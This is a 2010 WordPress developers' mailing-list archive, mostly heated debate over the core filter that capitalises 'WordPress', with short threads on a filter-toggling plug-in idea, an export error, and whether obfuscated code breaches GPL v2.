99% of those users will never write "WordPress" in a post anyways. And 
of those users, 99% won't notice, and the ones who do will just shrug 
and move on with their lives.

If it still bugs you that much, keep posting bugs and comments on Trac. 
And in the meantime, add the _one line of code_ to your sites that will 
disable  it.

Egads. Can we please have a 'wordpress-politics' mailing list for this 
noise?

-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/


From Gavin.Pearce at 3seven9.com  Wed Jul  7 15:38:18 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Wed, 7 Jul 2010 16:38:18 +0100
Subject: [wp-hackers] Putting the H in WordPress-Hackers
In-Reply-To: <4C349DC1.4010205@gunters.org>
References: <4C349DC1.4010205@gunters.org>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FDF@tbs-sbs01.TBS.local>

_Dougal Campbell_
> I would make an educated guess that 99% of WordPress users in the
world 
> honestly don't give a flying flip whether or not the software 
> automatically puts the proper case on the word "WordPress".

You said it - lets remove the function then and be done with this!  :)

_John Bloch_
> I know people that replace lists of offensive words with four
asterisks. 
> Can they now not use WordPress because they're violating the written
contents of those writers?

I don't see this being core code of WordPress or any other popular
projects so not sure what you're getting at here?

Gav



-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Dougal
Campbell
Sent: 07 July 2010 16:31
To: wp-hackers at lists.automattic.com
Subject: [wp-hackers] Putting the H in WordPress-Hackers

Can we be done with the 'P' discussion now? Please?

I would make an educated guess that 99% of WordPress users in the world 
honestly don't give a flying flip whether or not the software 
automatically puts the proper case on the word "WordPress". And probably

99% of those users will never write "WordPress" in a post anyways. And 
of those users, 99% won't notice, and the ones who do will just shrug 
and move on with their lives.

If it still bugs you that much, keep posting bugs and comments on Trac. 
And in the meantime, add the _one line of code_ to your sites that will 
disable  it.

Egads. Can we please have a 'wordpress-politics' mailing list for this 
noise?

-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From Gavin.Pearce at 3seven9.com  Wed Jul  7 15:39:02 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Wed, 7 Jul 2010 16:39:02 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C3492B5.2000108@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<201007061329.26694.chip@chipbennett.net>	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>	<201007061440.59637.chip@chipbennett.net>	<2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de><609CDAE8-6D93-47CA-8DC3-0F1F01DD5FD6@striderweb.com>
	<4C3492B5.2000108@mullenweg.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FE0@tbs-sbs01.TBS.local>

> If you're unlucky they find another pursuit that's more fun and has
less politics.

Nice-to-have functions such as the one in this discussion should be put
to the community - *not* at the whim of a couple of core devs. 

We are given freedoms under GPL - yes of course we are - that doesn't
mean we want to start hacking at core code and having custom WordPress
installs - you can't use that as an excuse for poor core code commits.

Maybe we should have a vote.

G

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Matt
Mullenweg
Sent: 07 July 2010 15:44
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

On 7/7/2010 9:11 AM, Stephen Rider wrote:
> I laughed when Matt said we were approaching Godwin's Law. :-)  Some
of the rhetoric is getting a bit overwrought, but for the most part I
think it's remained pretty civil.

We are -- someone is comparing the capitalization of the letter P with 
removing the sacred freedoms every WordPress user is given by the GPL. 
If you're someone who is frequently personally attacked, lied about, 
having cartoons drawn about you, etc for trying to protect that freedom 
it pushes it too far. There is a huge magnitude of difference.

The rest of your message is a bit long to respond to individually, but 
in summary:

Core development is a meritocracy. People pay their dues by working on 
*hard* issues that matter to end-users, like widgets, upgrades, speed 
and performance, and then they're then trusted with increasing rights 
and responsibilities.

The more attention paid to a trivial issue by a new contributor, hence 
the more distraction from the core people on the things that matter, 
that new contributor is spending their default community currency on 
something that is generating no returns.

If you want to map the decline of this mailing list, to the point it 
might as well be shut down, look at the number of words generated by 
people who don't contribute to core over time, or over "bikeshed" issues

that don't really matter. ( http://bikeshed.com/ ) (And also the 
atrocious email etiquette and quoting style that's taken over here.)

Eventually, the good people unsubscribe entirely, or go silent for 
months/years at a time. Why? Because they didn't get involved with 
WordPress because they love arguing on mailing lists. I'm involved 
because I love making it easy for people to build beautiful dynamic 
websites. I'm involved because I think the more people publishing, the 
better place the world will be. I'm involved because I love figuring out

elegant code or architecture solutions to tricky problems or UI
challenges.

So you withdraw. This thread would have been much much shorter, and 
probably better for everyone's perception, if I hadn't participated at
all.

If you're lucky, the people that withdraw from forums and mailing lists 
just focus on code. If you're unlucky they find another pursuit that's 
more fun and has less politics.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From skeltoac at gmail.com  Wed Jul  7 16:01:01 2010
From: skeltoac at gmail.com (Andy Skelton)
Date: Wed, 7 Jul 2010 11:01:01 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C3492B5.2000108@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061329.26694.chip@chipbennett.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>
	<201007061440.59637.chip@chipbennett.net>
	<2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de>
	<609CDAE8-6D93-47CA-8DC3-0F1F01DD5FD6@striderweb.com>
	<4C3492B5.2000108@mullenweg.com>
Message-ID: <AANLkTin_1uIRWzFoqgfnlw-SKw2rMSFA1pmc5hmVLywq@mail.gmail.com>

On the issue:
Had I been tapped, I would have declined to commit the filter. I know
Matt well enough to predict the reasons for his intentions and to know
that they are good and unselfish, even while opinionated and
objectionable.

On the discussion:
I muted this thread long ago. I don't know how it returned to my
Inbox. I feel I degrade myself by replying. I hope this does not imply
that I wasted my time reading the whole thing.

On Wed, Jul 7, 2010 at 9:44 AM, Matt Mullenweg <m at mullenweg.com> wrote:
> Eventually, the good people unsubscribe entirely, or go silent for
> months/years at a time. Why? Because they didn't get involved with WordPress
> because they love arguing on mailing lists.

For some reason I always subscribe again. Only until I find myself
spending more time muting than reading. As now.

Andy

From jbloch at olympianetworks.com  Wed Jul  7 16:05:42 2010
From: jbloch at olympianetworks.com (John Bloch)
Date: Wed, 7 Jul 2010 12:05:42 -0400
Subject: [wp-hackers] Putting the H in WordPress-Hackers
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FDF@tbs-sbs01.TBS.local>
References: <4C349DC1.4010205@gunters.org>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FDF@tbs-sbs01.TBS.local>
Message-ID: <769ACDF6-2EC8-4956-804C-99AD228FB9DD@olympianetworks.com>

What I'm getting at is that somewhere along the line, decisions are always made regarding content and filtering it, whether that be on the publisher's end (comment filtering) or on the developer's end (all filters in general. Seriously, this is exactly what they are made for). The other things that WordPress does to content are much more serious in how they filter it. autop and wptexturize do much much more to alter the content than capital_P_dangit, especially if, like me, you need to use regular quotes when writing snippets of code (or just don't want WP to 'fix' your html).

If you don't like it, add this to functions.php in your theme:

remove_filter('the_content','capital_P_dangit');
remove_filter('the_title','capital_P_dangit');
remove_filter('comment_text','capital_P_dangit');

There. Now you don't have capital P and you can appear ignorant of the correct spelling if you wish.

On Jul 7, 2010, at 11:38 AM, Gavin Pearce wrote:

> _Dougal Campbell_
>> I would make an educated guess that 99% of WordPress users in the
> world 
>> honestly don't give a flying flip whether or not the software 
>> automatically puts the proper case on the word "WordPress".
> 
> You said it - lets remove the function then and be done with this!  :)
> 
> _John Bloch_
>> I know people that replace lists of offensive words with four
> asterisks. 
>> Can they now not use WordPress because they're violating the written
> contents of those writers?
> 
> I don't see this being core code of WordPress or any other popular
> projects so not sure what you're getting at here?
> 
> Gav
> 
> 
> 
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Dougal
> Campbell
> Sent: 07 July 2010 16:31
> To: wp-hackers at lists.automattic.com
> Subject: [wp-hackers] Putting the H in WordPress-Hackers
> 
> Can we be done with the 'P' discussion now? Please?
> 
> I would make an educated guess that 99% of WordPress users in the world 
> honestly don't give a flying flip whether or not the software 
> automatically puts the proper case on the word "WordPress". And probably
> 
> 99% of those users will never write "WordPress" in a post anyways. And 
> of those users, 99% won't notice, and the ones who do will just shrug 
> and move on with their lives.
> 
> If it still bugs you that much, keep posting bugs and comments on Trac. 
> And in the meantime, add the _one line of code_ to your sites that will 
> disable  it.
> 
> Egads. Can we please have a 'wordpress-politics' mailing list for this 
> noise?
> 
> -- 
> Dougal Campbell <dougal at gunters.org>
> http://dougal.gunters.org/
> http://twitter.com/dougal
> http://twitual.com/
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From elfin at elfden.co.uk  Wed Jul  7 16:07:34 2010
From: elfin at elfden.co.uk (Rich Pedley)
Date: Wed, 07 Jul 2010 17:07:34 +0100
Subject: [wp-hackers] Putting the H in WordPress-Hackers
In-Reply-To: <4C349DC1.4010205@gunters.org>
References: <4C349DC1.4010205@gunters.org>
Message-ID: <4C34A646.3090402@elfden.co.uk>

On 07/07/2010 16:31, Dougal Campbell wrote:
> Can we be done with the 'P' discussion now? Please?
>
> I would make an educated guess that 99% of WordPress users in the world
> honestly don't give a flying flip whether or not the software
> automatically puts the proper case on the word "WordPress". And probably
> 99% of those users will never write "WordPress" in a post anyways. And
> of those users, 99% won't notice, and the ones who do will just shrug
> and move on with their lives.

and will probably only affect a minority of people actually posting in 
this thread.


> If it still bugs you that much, keep posting bugs and comments on Trac.
> And in the meantime, add the _one line of code_ to your sites that will
> disable  it.

Which if people stop and think is what they do all the time, 
especially the people posting in this thread. You write workarounds 
for minor things a lot(yes it's an assumption, call it an educated 
guess) - consider this yet another to add in and move on.

Rich
(formerly posted from elflop at googlemail.com)





From eric at eamann.com  Wed Jul  7 16:12:40 2010
From: eric at eamann.com (Eric Mann)
Date: Wed, 7 Jul 2010 09:12:40 -0700 (PDT)
Subject: [wp-hackers] Filter Visualization
Message-ID: <1078736248.136355.1278519160456.JavaMail.open-xchange@oxusltgw11.schlund.de>

OK, this is the third time I've tried sending this email ... hopefully it goes
through for once.
?
Over the past week or so I've been building a JavaScript-based event bus for a
few of my projects. ?In execution, it's very similar to the action hook
structure of WordPress (which itself is an extension of the filter structure in
WordPress). ?Given the overwhelming popularity of filters on this list lately
:-), I had the idea for a plug-in that I wanted to pass by and get feedback on
before digging into it.
?
My idea: A plug-in allows you to see all filters currently being used on the
site and selectively turn them on or off without touching the code. ?This would
give power users the ability to quickly shut off filters they don't like, and
would allow lay users to disable new features that might break a legacy site.
?
Since it would be a plug-in, it wouldn't add additional options screens to core,
but one day might even be able to take ownership of some of the filter toggles
already in core (i.e. emoticons).
?
Do you see any value in a plug-in like this? ?Why or why not?
?
~Eric Mann

From wphackers at jakemgold.myfastmail.com  Wed Jul  7 16:56:44 2010
From: wphackers at jakemgold.myfastmail.com (Jake Goldman)
Date: Wed, 07 Jul 2010 12:56:44 -0400
Subject: [wp-hackers] Filter Visualization
In-Reply-To: <1078736248.136355.1278519160456.JavaMail.open-xchange@oxusltgw11.schlund.de>
References: <1078736248.136355.1278519160456.JavaMail.open-xchange@oxusltgw11.schlund.de>
Message-ID: <4C34B1CC.1080809@jakemgold.myfastmail.com>

  Are you strictly targeting content manipulation filters? There are a 
lot of filters in WordPress...

Haven't given this a lot of thought, but off the cuff, it seems like 
"layman" users might not fully understand the consequences of 
haphazardly turning on and off certain filters. You may be able to 
document the purpose of some common filters (capital P, smilies, autop, 
etc), but that's a losing game, particularly since you can't document 
every filter added by third party plug-ins.

Developers and more sophisticated users may have a better grasp of what, 
exactly, they're enabling and disabling, but can also much more 
elegantly (and with far less overhead) turn off filters with one line of 
code.

In short, I couldn't see me, my dev team, or any of our clients using 
"one filter managing plug-in to rule them all."

Just my off the cuff two cents.

Jake


On 7/7/2010 12:12 PM, Eric Mann wrote:
> OK, this is the third time I've tried sending this email ... hopefully it goes
> through for once.
>   
> Over the past week or so I've been building a JavaScript-based event bus for a
> few of my projects.  In execution, it's very similar to the action hook
> structure of WordPress (which itself is an extension of the filter structure in
> WordPress).  Given the overwhelming popularity of filters on this list lately
> :-), I had the idea for a plug-in that I wanted to pass by and get feedback on
> before digging into it.
>   
> My idea: A plug-in allows you to see all filters currently being used on the
> site and selectively turn them on or off without touching the code.  This would
> give power users the ability to quickly shut off filters they don't like, and
> would allow lay users to disable new features that might break a legacy site.
>   
> Since it would be a plug-in, it wouldn't add additional options screens to core,
> but one day might even be able to take ownership of some of the filter toggles
> already in core (i.e. emoticons).
>   
> Do you see any value in a plug-in like this?  Why or why not?
>   
> ~Eric Mann
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From abraoximenes at yahoo.com  Wed Jul  7 17:18:25 2010
From: abraoximenes at yahoo.com (Abrao Ximenes)
Date: Wed, 7 Jul 2010 10:18:25 -0700 (PDT)
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 33
In-Reply-To: <mailman.9705.1278517155.1338.wp-hackers@lists.automattic.com>
Message-ID: <836218.1028.qm@web56703.mail.re3.yahoo.com>



--- On Wed, 7/7/10, wp-hackers-request at lists.automattic.com <wp-hackers-request at lists.automattic.com> wrote:

From: wp-hackers-request at lists.automattic.com <wp-hackers-request at lists.automattic.com>
Subject: wp-hackers Digest, Vol 66, Issue 33
To: wp-hackers at lists.automattic.com
Date: Wednesday, July 7, 2010, 8:39 AM

Send wp-hackers mailing list submissions to
??? wp-hackers at lists.automattic.com

To subscribe or unsubscribe via the World Wide Web, visit
??? http://lists.automattic.com/mailman/listinfo/wp-hackers
or, via email, send a message with subject or body 'help' to
??? wp-hackers-request at lists.automattic.com

You can reach the person managing the list at
??? wp-hackers-owner at lists.automattic.com

When replying, please edit your Subject line so it is more specific
than "Re: Contents of wp-hackers digest..."


Today's Topics:

???1. Re: Export errors (3.0 / multisite) (Bob Uehlein)
???2. Re: Putting the P in WordPress (John Bloch)
???3. Re: Putting the P in WordPress (Doug Stewart)
???4. Putting the H in WordPress-Hackers (Dougal Campbell)
???5. Re: Putting the H in WordPress-Hackers (Gavin Pearce)
???6. Re: Putting the P in WordPress (Gavin Pearce)


----------------------------------------------------------------------

Message: 1
Date: Wed, 07 Jul 2010 11:24:46 -0400
From: Bob Uehlein <uehlein at gmail.com>
Subject: Re: [wp-hackers] Export errors (3.0 / multisite)
To: wp-hackers at lists.automattic.com
Message-ID: <4C349C3E.7090700 at gmail.com>
Content-Type: text/plain; charset=ISO-8859-1; format=flowed

I was getting this error this weekend. I went into trac and got the 
latest export.php and replaced my current with that one. Worked fine then.



On 7/7/10 11:18 AM, Christopher Ross wrote:
> <br />
> <b>Warning</b>:? Illegal offset type in<b>/nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-includes/taxonomy.php</b>? on line<b>176</b><br />
> <br />
> <b>Warning</b>:? Cannot modify header information - headers already sent by (output started at /nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-includes/taxonomy.php:176) in<b>/nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-admin/includes/export.php</b>? on line<b>44</b><br />
> <br />
> <b>Warning</b>:? Cannot modify header information - headers already sent by (output started at /nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-includes/taxonomy.php:176) in<b>/nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-admin/includes/export.php</b>? on line<b>45</b><br />
> <br />
> <b>Warning</b>:? Cannot modify header information - headers already sent by (output started at /nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-includes/taxonomy.php:176) in<b>/nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-admin/includes/export.php</b>? on line<b>46</b><br />
> <?xml version="1.0" encoding="UTF-8"?>
> <!-- This is a WordPress eXtended RSS file generated by WordPress as an export of your blog. -->
> <!-- It contains information about your blog's posts, comments, and categories. -->
> <!-- You may use this file to transfer that content from one site to another. -->
> <!-- This file is not intended to serve as a complete backup of your blog. -->
>
>
> This is the first time I've tried doing an export since the 3.0 update, is anybody else seeing an error like this or is it specific to my configuration?
>
> c.
> __
>
> Christopher Ross
>
> Toronto? ? ? 1 (416) 840-5828
> Fredericton 1 (506) 474-2708
>
> http://christopherross.ca
> http://www.thisismyurl.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>? ? 


------------------------------

Message: 2
Date: Wed, 7 Jul 2010 11:27:47 -0400
From: John Bloch <jbloch at olympianetworks.com>
Subject: Re: [wp-hackers] Putting the P in WordPress
To: wp-hackers at lists.automattic.com
Message-ID: <D91265CD-9B6B-4B29-AA34-7835E54E6D79 at olympianetworks.com>
Content-Type: text/plain; charset=us-ascii

Yes it's a community. Like any other community, there are leaders and prominent figures in that community. Take Andrew Nacin, for example. Hardly anybody knew his name a year ago. And now he's a core contributor, because he earned that respect. Nobody's going to stop you from joining the community and becoming a prominent voice, but nobody will listen to someone who contributes nothing productive. I'm not saying you have nothing to contribute, but trashing Matt and the rest of the devs for their contributions doesn't help, especially if you didn't participate in that discussion to begin with.

Changing Wordpress to WordPress is not something to get up in arms about. I know people that replace lists of offensive words with four asterisks. Can they now not use WordPress because they're violating the written contents of those writers? That seems like a bigger violation of 'written content' than this, doesn't it?

On Jul 7, 2010, at 11:13 AM, Gavin Pearce wrote:

>> WordPress isn't Matt's company, it's the community's project.
> 
> Sure doesn't seem that way here ...
> 
>> If you wanted to influence the direction of core, you should
> contribute and earn the respect that will get you that influence.
> 
> I thought you just said this was a community driven project, not one
> directed by a small number of core people with 'influence'?
> 
>> WordPress also changes regular quotes to curly quotes with a filter,
> and -- to en-dash and --- to em-dash and ... to elipses?! OH THE
> INHUMANITY!!!
> 
> That's not written content as such though - which is the issue here.
> (Though I must admit to having that switched off also).
> 
> Gav
> 
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of John Bloch
> Sent: 07 July 2010 16:05
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Putting the P in WordPress
> 
> WordPress isn't Matt's company, it's the community's project. This
> addition to core was discussed in dev chats just like every other
> addition in WordPress. Like Matt said, WordPress development is a
> meritocracy. If you wanted to influence the direction of core, you
> should contribute and earn the respect that will get you that influence.
> I've been watching this thread for the last two days and think this is
> the silliest argument I've ever seen. If you don't like the filter,
> remove it! It's one line of code. Did you know that WordPress also
> changes regular quotes to curly quotes with a filter, and -- to en-dash
> and --- to em-dash and ... to elipses?! OH THE INHUMANITY!!!
> 
> On Jul 7, 2010, at 10:52 AM, Thomas Belknap wrote:
> 
>> Wait, Matt, holy crap.
>> 
>> You've spent the better part of two days fueling a debate that would
> have
>> been long-dead without you engaging and then you bemoan the civility
> and
>> quality of this list's posting? I keep having to throw away emails
> that
>> contribute *absolutely nothing but a P* to WordPress or my life, but
> you
>> claim the moral high ground?
>> 
>> Its your company, I suppose.
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers



------------------------------

Message: 3
Date: Wed, 7 Jul 2010 11:28:49 -0400
From: Doug Stewart <zamoose at gmail.com>
Subject: Re: [wp-hackers] Putting the P in WordPress
To: wp-hackers at lists.automattic.com
Message-ID:
??? <AANLkTinjWXFvhqCaQEWUrIiN3i-LESqJ-BBK8z1OZECE at mail.gmail.com>
Content-Type: text/plain; charset=ISO-8859-1

On 7/7/10, Matt Mullenweg <m at mullenweg.com> wrote:
> On 7/7/2010 9:11 AM, Stephen Rider wrote:
>> I laughed when Matt said we were approaching Godwin's Law. :-)? Some of
>> the rhetoric is getting a bit overwrought, but for the most part I think
>> it's remained pretty civil.
>
> We are -- someone is comparing the capitalization of the letter P with
> removing the sacred freedoms every WordPress user is given by the GPL.
> If you're someone who is frequently personally attacked, lied about,
> having cartoons drawn about you, etc for trying to protect that freedom
> it pushes it too far. There is a huge magnitude of difference.
>

You're doing it wrong. Not a single soul brought out a comparison to
Hitler or Nazis.

http://en.wikipedia.org/wiki/Godwins_Law

"As an online discussion grows longer, the probability of a comparison
involving Nazis or Hitler approaches 1."

You self-Godwinned, thus I invoke Quirk's Exception.

> The rest of your message is a bit long to respond to individually, but
> in summary:
>
> Core development is a meritocracy. People pay their dues by working on
> *hard* issues that matter to end-users, like widgets, upgrades, speed
> and performance, and then they're then trusted with increasing rights
> and responsibilities.
>
> The more attention paid to a trivial issue by a new contributor, hence
> the more distraction from the core people on the things that matter,
> that new contributor is spending their default community currency on
> something that is generating no returns.
>

I thought "we" were taking a release cycle off to work on community
issues. What better time than when the core devs have no pressing code
need?


> If you want to map the decline of this mailing list, to the point it
> might as well be shut down, look at the number of words generated by
> people who don't contribute to core over time, or over "bikeshed" issues
> that don't really matter. ( http://bikeshed.com/ ) (And also the
> atrocious email etiquette and quoting style that's taken over here.)
>

So then shutter Hackers. If it's really the wretched hive of scum and
villainy that folks make it out to be, nuke it from orbit.

> Eventually, the good people unsubscribe entirely, or go silent for
> months/years at a time. Why? Because they didn't get involved with
> WordPress because they love arguing on mailing lists. I'm involved
> because I love making it easy for people to build beautiful dynamic
> websites. I'm involved because I think the more people publishing, the
> better place the world will be. I'm involved because I love figuring out
> elegant code or architecture solutions to tricky problems or UI challenges.
>

Your suggestion that those who disagree with you DON'T value those
things truly rankles.? If you're trying to engender reasoned debate
and healthy contributions, publicly impugning others' motives is a
lousy way to start.


-- 
-Doug
@zamoose
http://literalbarrage.org/blog/


------------------------------

Message: 4
Date: Wed, 07 Jul 2010 11:31:13 -0400
From: Dougal Campbell <dougal at gunters.org>
Subject: [wp-hackers] Putting the H in WordPress-Hackers
To: wp-hackers at lists.automattic.com
Message-ID: <4C349DC1.4010205 at gunters.org>
Content-Type: text/plain; charset=UTF-8; format=flowed

Can we be done with the 'P' discussion now? Please?

I would make an educated guess that 99% of WordPress users in the world 
honestly don't give a flying flip whether or not the software 
automatically puts the proper case on the word "WordPress". And probably 
99% of those users will never write "WordPress" in a post anyways. And 
of those users, 99% won't notice, and the ones who do will just shrug 
and move on with their lives.

If it still bugs you that much, keep posting bugs and comments on Trac. 
And in the meantime, add the _one line of code_ to your sites that will 
disable? it.

Egads. Can we please have a 'wordpress-politics' mailing list for this 
noise?

-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/



------------------------------

Message: 5
Date: Wed, 7 Jul 2010 16:38:18 +0100
From: "Gavin Pearce" <Gavin.Pearce at 3seven9.com>
Subject: Re: [wp-hackers] Putting the H in WordPress-Hackers
To: <wp-hackers at lists.automattic.com>
Message-ID:
??? <CD47955B7E065D48AB5CF226C2ED75C02E2FDF at tbs-sbs01.TBS.local>
Content-Type: text/plain;??? charset="US-ASCII"

_Dougal Campbell_
> I would make an educated guess that 99% of WordPress users in the
world 
> honestly don't give a flying flip whether or not the software 
> automatically puts the proper case on the word "WordPress".

You said it - lets remove the function then and be done with this!? :)

_John Bloch_
> I know people that replace lists of offensive words with four
asterisks. 
> Can they now not use WordPress because they're violating the written
contents of those writers?

I don't see this being core code of WordPress or any other popular
projects so not sure what you're getting at here?

Gav



-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Dougal
Campbell
Sent: 07 July 2010 16:31
To: wp-hackers at lists.automattic.com
Subject: [wp-hackers] Putting the H in WordPress-Hackers

Can we be done with the 'P' discussion now? Please?

I would make an educated guess that 99% of WordPress users in the world 
honestly don't give a flying flip whether or not the software 
automatically puts the proper case on the word "WordPress". And probably

99% of those users will never write "WordPress" in a post anyways. And 
of those users, 99% won't notice, and the ones who do will just shrug 
and move on with their lives.

If it still bugs you that much, keep posting bugs and comments on Trac. 
And in the meantime, add the _one line of code_ to your sites that will 
disable? it.

Egads. Can we please have a 'wordpress-politics' mailing list for this 
noise?

-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


------------------------------

Message: 6
Date: Wed, 7 Jul 2010 16:39:02 +0100
From: "Gavin Pearce" <Gavin.Pearce at 3seven9.com>
Subject: Re: [wp-hackers] Putting the P in WordPress
To: <wp-hackers at lists.automattic.com>
Message-ID:
??? <CD47955B7E065D48AB5CF226C2ED75C02E2FE0 at tbs-sbs01.TBS.local>
Content-Type: text/plain;??? charset="US-ASCII"

> If you're unlucky they find another pursuit that's more fun and has
less politics.

Nice-to-have functions such as the one in this discussion should be put
to the community - *not* at the whim of a couple of core devs. 

We are given freedoms under GPL - yes of course we are - that doesn't
mean we want to start hacking at core code and having custom WordPress
installs - you can't use that as an excuse for poor core code commits.

Maybe we should have a vote.

G

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Matt
Mullenweg
Sent: 07 July 2010 15:44
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

On 7/7/2010 9:11 AM, Stephen Rider wrote:
> I laughed when Matt said we were approaching Godwin's Law. :-)? Some
of the rhetoric is getting a bit overwrought, but for the most part I
think it's remained pretty civil.

We are -- someone is comparing the capitalization of the letter P with 
removing the sacred freedoms every WordPress user is given by the GPL. 
If you're someone who is frequently personally attacked, lied about, 
having cartoons drawn about you, etc for trying to protect that freedom 
it pushes it too far. There is a huge magnitude of difference.

The rest of your message is a bit long to respond to individually, but 
in summary:

Core development is a meritocracy. People pay their dues by working on 
*hard* issues that matter to end-users, like widgets, upgrades, speed 
and performance, and then they're then trusted with increasing rights 
and responsibilities.

The more attention paid to a trivial issue by a new contributor, hence 
the more distraction from the core people on the things that matter, 
that new contributor is spending their default community currency on 
something that is generating no returns.

If you want to map the decline of this mailing list, to the point it 
might as well be shut down, look at the number of words generated by 
people who don't contribute to core over time, or over "bikeshed" issues

that don't really matter. ( http://bikeshed.com/ ) (And also the 
atrocious email etiquette and quoting style that's taken over here.)

Eventually, the good people unsubscribe entirely, or go silent for 
months/years at a time. Why? Because they didn't get involved with 
WordPress because they love arguing on mailing lists. I'm involved 
because I love making it easy for people to build beautiful dynamic 
websites. I'm involved because I think the more people publishing, the 
better place the world will be. I'm involved because I love figuring out

elegant code or architecture solutions to tricky problems or UI
challenges.

So you withdraw. This thread would have been much much shorter, and 
probably better for everyone's perception, if I hadn't participated at
all.

If you're lucky, the people that withdraw from forums and mailing lists 
just focus on code. If you're unlucky they find another pursuit that's 
more fun and has less politics.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


------------------------------

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


End of wp-hackers Digest, Vol 66, Issue 33
******************************************



      

From peter.westwood at ftwr.co.uk  Wed Jul  7 17:26:40 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed, 7 Jul 2010 18:26:40 +0100
Subject: [wp-hackers] Fwd: Re:  Putting the P in WordPress
In-Reply-To: <4C3497BA.2090704@simplercomputing.net>
References: <4C3497BA.2090704@simplercomputing.net>
Message-ID: <0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>


On 7 Jul 2010, at 16:05, Mark E wrote:

> The obfuscation of the easter egg blatantly violates GPL v2. So all the
> stuff you say about GPL boils down to this: "Do as I as say, not as I
> do". And here I was thinking that you followed GPL to the letter, as you imply other people should do.


In what way?

I believe the specific wording from the GPL2 you are interpreting is:

"The source code for a work means the preferred form of the work for making modifications to it. For an executable work, complete source code means all the source code for all modules it contains, plus any associated interface definition files, plus the scripts used to control compilation and installation of the executable. However, as a special exception, the source code distributed need not include anything that is normally distributed (in either source or binary form) with the major components (compiler, kernel, and so on) of the operating system on which the executable runs, unless that component itself accompanies the executable. "

In my reading in no way does this preclude the distribution of obfuscated code - what it is trying to prevent is the distribution of compiled object files without the corresponding source code to allow modifications to be made.

As JS and PHP are always distributed in source form as part of the WordPress download I don't see how we are violating the licence.

Would you consider it a licence violation if we were to ship WordPress without the include .dev.js files so as to decrease the download size and make automatic upgrades use less memory?

Cheers
-- 
Peter Westwood
